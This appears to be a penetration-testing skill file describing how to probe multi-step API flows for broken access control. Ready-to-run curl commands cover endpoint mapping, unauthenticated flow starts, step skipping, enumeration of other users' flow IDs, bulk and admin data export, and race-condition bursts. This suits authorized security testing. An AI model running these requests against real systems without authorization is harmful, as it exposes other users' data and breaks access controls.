---
name: api-flow-hijack
description: Multi-step API flow broken access control exploitation
version: 1.0.0
phase: recon
category: discovery
tags: [api, access-control, broken-auth, web]
tools: [curl]
difficulty: advanced
opsec_level: medium
time_estimate: 15m
severity_if_found: high
related_skills:
  - cors-variants-deep
  - hardcoded-credentials
mitre_attack:
  - T1190
---

## When to Use

- Target has multi-step workflows (registration, checkout, upload, export)
- Testing for broken access control in sequential API flows
- Hunting IDOR or privilege escalation in business logic

## Prerequisites

- curl installed
- Understanding of target application flow
- Valid and invalid session tokens

## Procedure

### 1. Map API Flow Endpoints

```bash
curl -s "https://TARGET/" | grep -oP '"/api/[^"]*"' | sort -u > api_endpoints.txt
for path in /api/start /api/submit /api/upload /api/export \
  /api/v1/start /api/v1/submit /api/v2/upload; do
  STATUS=$(curl -sI "https://TARGET$path" -o /dev/null -w "%{http_code}")
  [ "$STATUS" != "404" ] && echo "$path: $STATUS"
done
```

### 2. Start Flow Without Auth

```bash
curl -s -X POST "https://TARGET/api/start" \
  -H "Content-Type: application/json" \
  -d '{"type":"document","name":"test"}' | python3 -m json.tool 2>/dev/null
```

### 3. Step Skipping — Jump to Final Step

```bash
curl -s -X POST "https://TARGET/api/submit" \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer YOUR_TOKEN" \
  -d '{"flow_id":"12345","step":"final"}' | python3 -m json.tool 2>/dev/null
```

### 4. IDOR in Flow Steps

```bash
curl -s -X GET "https://TARGET/api/flow/OTHER_USERS_FLOW_ID" \
  -H "Authorization: Bearer YOUR_TOKEN" | python3 -m json.tool 2>/dev/null

for i in $(seq 1000 1010); do
  STATUS=$(curl -sI "https://TARGET/api/flow/$i" -o /dev/null -w "%{http_code}")
  [ "$STATUS" = "200" ] && echo "Flow $i accessible"
done
```

### 5. Upload Flow Bypass

```bash
curl -s -X POST "https://TARGET/api/upload" \
  -H "Authorization: Bearer YOUR_TOKEN" \
  -F "file=@test.txt" -F "flow_id=12345" | python3 -m json.tool 2>/dev/null
```

### 6. Export Flow Data Extraction

```bash
curl -s "https://TARGET/api/export?format=csv&all=true" \
  -H "Authorization: Bearer YOUR_TOKEN" -o export.csv

for endpoint in /api/admin/export /api/internal/export /api/reports/export; do
  STATUS=$(curl -sI "https://TARGET$endpoint" -o /dev/null -w "%{http_code}")
  [ "$STATUS" != "404" ] && echo "EXPORT: $endpoint ($STATUS)"
done
```

### 7. Race Condition Test

```bash
for i in $(seq 1 10); do
  curl -s -X POST "https://TARGET/api/submit" \
    -H "Authorization: Bearer YOUR_TOKEN" -d '{"flow_id":"12345"}' &
done
wait
```

## OPSEC Rules

- Do NOT exfiltrate actual user data during recon
- Only test with your own accounts and flow IDs
- Document exact request/response for each finding
- Do not perform race conditions against production without authorization

## Verification

```bash
curl -s -X GET "https://TARGET/api/flow/OTHER_USERS_FLOW_ID" \
  -H "Authorization: Bearer YOUR_TOKEN" | grep -c "error"
# Should return 0 if access is granted
```

## Pitfalls

- Some flows require CSRF tokens — capture from initial GET request
- Rate limiting may block rapid sequential testing
- Business logic may require specific data format per step
- API versioning may expose different access controls

## Output Format

```json
{
  "target": "https://TARGET",
  "flow_endpoints": ["/api/start", "/api/submit", "/api/upload", "/api/export"],
  "broken_access_control": [
    {"endpoint": "/api/flow/{id}", "type": "IDOR", "severity": "high"},
    {"endpoint": "/api/export", "type": "missing-auth", "severity": "critical"}
  ],
  "race_condition_possible": false
}
```
